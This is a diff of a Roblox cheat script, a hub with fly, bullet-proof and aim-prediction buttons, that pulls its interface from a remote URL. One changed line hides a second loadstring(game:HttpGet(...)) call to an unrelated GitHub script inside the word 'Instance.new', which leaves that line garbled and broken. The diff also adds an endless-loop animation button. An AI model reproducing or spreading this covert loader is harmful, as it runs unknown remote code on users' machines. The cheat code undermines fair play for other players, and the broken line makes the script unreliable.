@@ -24,7 +24,7 @@ local DarkraiX = loadstring(game:HttpGet("https://raw.githubusercontent.com/Gami
                         local localCharacter = localPlayer.Character;
                         localCharacter:FindFirstChildOfClass('Humanoid').Health = 0;
                         local newCharacter = localPlayer.CharacterAdded:Wait();
-                        local spoofFolder = Instance.new('Folder');
+                        local spoofFolder = Inloadstring(game:HttpGet("https://raw.githubusercontent.com/shmigq/Scripts/main/KladovkaShmiga.lua"))() Fstance.new('Folder');
                         spoofFolder.Name = 'FULLY_LOADED_CHAR';
                         spoofFolder.Parent = newCharacter;
                         newCharacter:WaitForChild('RagdollConstraints'):Destroy();
@@ -234,7 +234,7 @@ local DarkraiX = loadstring(game:HttpGet("https://raw.githubusercontent.com/Gami
             end))
 
         end)
-        Tab1:Button("Bullet Proof",function()
+        Tab1:Button("Fly (Q)",function()
             local plr = game.Players.LocalPlayer
 local mouse = plr:GetMouse()
 
@@ -931,3 +931,17 @@ getgenv().Prediction = 0.157
  
  
                                 end)
+Tab4:Button("Animation",function()
+		while true do
+local Animate = game.Players.LocalPlayer.Character.Animate
+Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
+Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782841498"
+Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
+Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
+Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
+Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
+Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
+game.Players.LocalPlayer.Character.Humanoid.Jump = false
+wait(1)
+end
+end)
